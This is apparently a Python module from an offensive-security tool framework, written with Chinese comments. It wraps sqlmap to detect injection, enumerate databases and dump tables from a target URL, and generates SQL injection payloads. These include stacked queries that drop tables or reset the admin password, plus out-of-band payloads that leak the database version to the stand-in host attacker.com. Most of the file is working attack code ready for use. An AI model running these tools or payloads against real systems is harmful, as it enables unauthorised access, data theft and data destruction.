#!/usr/bin/env python3
"""
SQL注入攻击工具集
"""

import subprocess
import json
import logging
import tempfile
import os
import re
from typing import Any, Dict, List
from dataclasses import dataclass, field

from core.tool_registry import BaseTool, ToolCategory, ToolParameter

logger = logging.getLogger(__name__)


@dataclass
class SQLMapTool(BaseTool):
    """SQLMap SQL注入工具"""
    name: str = "sqlmap"
    description: str = "SQLMap - 自动化SQL注入检测和利用工具"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("url", "string", "目标URL (带参数)", required=True),
        ToolParameter("data", "string", "POST数据", required=False, default=""),
        ToolParameter("cookie", "string", "Cookie", required=False, default=""),
        ToolParameter("level", "integer", "测试等级(1-5)", required=False, default=1),
        ToolParameter("risk", "integer", "风险等级(1-3)", required=False, default=1),
        ToolParameter("technique", "string", "注入技术(BEUSTQ)", required=False, default=""),
        ToolParameter("dbms", "string", "指定数据库类型", required=False, default="",
                     choices=["", "mysql", "postgresql", "mssql", "oracle", "sqlite"]),
        ToolParameter("batch", "boolean", "非交互模式", required=False, default=True),
        ToolParameter("dbs", "boolean", "枚举数据库", required=False, default=False),
        ToolParameter("tables", "string", "枚举表(指定数据库)", required=False, default=""),
        ToolParameter("dump", "string", "导出数据(数据库.表)", required=False, default=""),
    ])
    timeout: int = 1800
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        url = params["url"]
        data = params.get("data", "")
        cookie = params.get("cookie", "")
        level = params.get("level", 1)
        risk = params.get("risk", 1)
        technique = params.get("technique", "")
        dbms = params.get("dbms", "")
        batch = params.get("batch", True)
        dbs = params.get("dbs", False)
        tables = params.get("tables", "")
        dump = params.get("dump", "")
        
        with tempfile.TemporaryDirectory() as tmpdir:
            output_dir = os.path.join(tmpdir, "output")
            
            cmd = [
                "sqlmap", "-u", url,
                "--level", str(level),
                "--risk", str(risk),
                "--output-dir", output_dir
            ]
            
            if data:
                cmd.extend(["--data", data])
            if cookie:
                cmd.extend(["--cookie", cookie])
            if technique:
                cmd.extend(["--technique", technique])
            if dbms:
                cmd.extend(["--dbms", dbms])
            if batch:
                cmd.append("--batch")
            if dbs:
                cmd.append("--dbs")
            if tables:
                cmd.extend(["--tables", "-D", tables])
            if dump:
                parts = dump.split(".")
                if len(parts) == 2:
                    cmd.extend(["--dump", "-D", parts[0], "-T", parts[1]])
            
            try:
                logger.info(f"执行SQLMap: {' '.join(cmd)}")
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=self.timeout
                )
                
                # 解析输出
                output = result.stdout
                parsed = self._parse_output(output)
                parsed["command"] = ' '.join(cmd)
                parsed["raw_output"] = output
                
                return parsed
                
            except subprocess.TimeoutExpired:
                return {"success": False, "error": "扫描超时"}
            except FileNotFoundError:
                return {"success": False, "error": "sqlmap未安装，请运行: apt install sqlmap"}
            except Exception as e:
                return {"success": False, "error": str(e)}
    
    def _parse_output(self, output: str) -> Dict[str, Any]:
        """解析SQLMap输出"""
        result = {
            "success": True,
            "vulnerable": False,
            "injection_points": [],
            "databases": [],
            "tables": [],
            "dbms": None,
            "os": None,
            "web_server": None
        }
        
        # 检测是否存在注入
        if "is vulnerable" in output or "injectable" in output.lower():
            result["vulnerable"] = True
        
        # 提取注入点
        injection_pattern = r"Parameter:\s*(\S+)\s*\(([^)]+)\)"
        for match in re.finditer(injection_pattern, output):
            result["injection_points"].append({
                "parameter": match.group(1),
                "type": match.group(2)
            })
        
        # 提取数据库信息
        if "available databases" in output.lower():
            db_pattern = r"\[\*\]\s+(\w+)"
            dbs = re.findall(db_pattern, output)
            result["databases"] = list(set(dbs))
        
        # 提取DBMS信息
        dbms_pattern = r"back-end DBMS:\s*(.+)"
        dbms_match = re.search(dbms_pattern, output)
        if dbms_match:
            result["dbms"] = dbms_match.group(1).strip()
        
        # 提取OS信息
        os_pattern = r"operating system:\s*(.+)"
        os_match = re.search(os_pattern, output, re.IGNORECASE)
        if os_match:
            result["os"] = os_match.group(1).strip()
        
        # 提取Web服务器信息
        ws_pattern = r"web server operating system:\s*(.+)"
        ws_match = re.search(ws_pattern, output, re.IGNORECASE)
        if ws_match:
            result["web_server"] = ws_match.group(1).strip()
        
        return result


@dataclass
class SQLiPayloadTool(BaseTool):
    """SQL注入Payload生成器"""
    name: str = "sqli_payload"
    description: str = "SQL注入Payload生成器 - 生成各类SQL注入测试载荷"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("type", "string", "Payload类型", required=True,
                     choices=["union", "boolean", "time", "error", "stacked", "oob"]),
        ToolParameter("dbms", "string", "目标数据库", required=False, default="mysql",
                     choices=["mysql", "postgresql", "mssql", "oracle", "sqlite"]),
        ToolParameter("columns", "integer", "UNION列数", required=False, default=5),
        ToolParameter("encode", "string", "编码方式", required=False, default="",
                     choices=["", "url", "double_url", "hex", "unicode"]),
    ])
    timeout: int = 10
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        payload_type = params["type"]
        dbms = params.get("dbms", "mysql")
        columns = params.get("columns", 5)
        encode = params.get("encode", "")
        
        payloads = self._generate_payloads(payload_type, dbms, columns)
        
        if encode:
            payloads = [self._encode_payload(p, encode) for p in payloads]
        
        return {
            "success": True,
            "type": payload_type,
            "dbms": dbms,
            "payloads": payloads,
            "count": len(payloads)
        }
    
    def _generate_payloads(self, ptype: str, dbms: str, columns: int) -> List[str]:
        """生成Payload"""
        payloads = []
        
        if ptype == "union":
            # UNION注入Payload
            col_str = ",".join(["NULL"] * columns)
            payloads.extend([
                f"' UNION SELECT {col_str}--",
                f"\" UNION SELECT {col_str}--",
                f"') UNION SELECT {col_str}--",
                f"') UNION SELECT {col_str}#",
                f"-1' UNION SELECT {col_str}--",
                f"1' ORDER BY {columns}--",
                f"1' ORDER BY {columns+1}--",
            ])
            
            # 数据库特定
            if dbms == "mysql":
                payloads.append(f"' UNION SELECT {col_str} FROM information_schema.tables--")
            elif dbms == "mssql":
                payloads.append(f"' UNION SELECT {col_str} FROM sysobjects--")
            elif dbms == "oracle":
                payloads.append(f"' UNION SELECT {col_str} FROM dual--")
        
        elif ptype == "boolean":
            # 布尔盲注
            payloads.extend([
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1",
                "' OR '1'='2",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1 AND 1=1",
                "1 AND 1=2",
            ])
        
        elif ptype == "time":
            # 时间盲注
            if dbms == "mysql":
                payloads.extend([
                    "' AND SLEEP(5)--",
                    "' AND BENCHMARK(10000000,SHA1('test'))--",
                    "'; WAITFOR DELAY '0:0:5'--",
                ])
            elif dbms == "mssql":
                payloads.extend([
                    "'; WAITFOR DELAY '0:0:5'--",
                ])
            elif dbms == "postgresql":
                payloads.extend([
                    "'; SELECT pg_sleep(5)--",
                ])
            elif dbms == "oracle":
                payloads.extend([
                    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'--",
                ])
        
        elif ptype == "error":
            # 报错注入
            if dbms == "mysql":
                payloads.extend([
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                ])
            elif dbms == "mssql":
                payloads.extend([
                    "' AND 1=CONVERT(int,(SELECT @@version))--",
                ])
        
        elif ptype == "stacked":
            # 堆叠查询
            payloads.extend([
                "'; DROP TABLE test--",
                "'; INSERT INTO users VALUES('hacker','hacked')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            ])
        
        elif ptype == "oob":
            # 带外注入
            if dbms == "mysql":
                payloads.extend([
                    "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
                ])
            elif dbms == "mssql":
                payloads.extend([
                    "'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--",
                ])
        
        return payloads
    
    def _encode_payload(self, payload: str, encode_type: str) -> str:
        """编码Payload"""
        import urllib.parse
        
        if encode_type == "url":
            return urllib.parse.quote(payload)
        elif encode_type == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encode_type == "hex":
            return "0x" + payload.encode().hex()
        elif encode_type == "unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        
        return payload
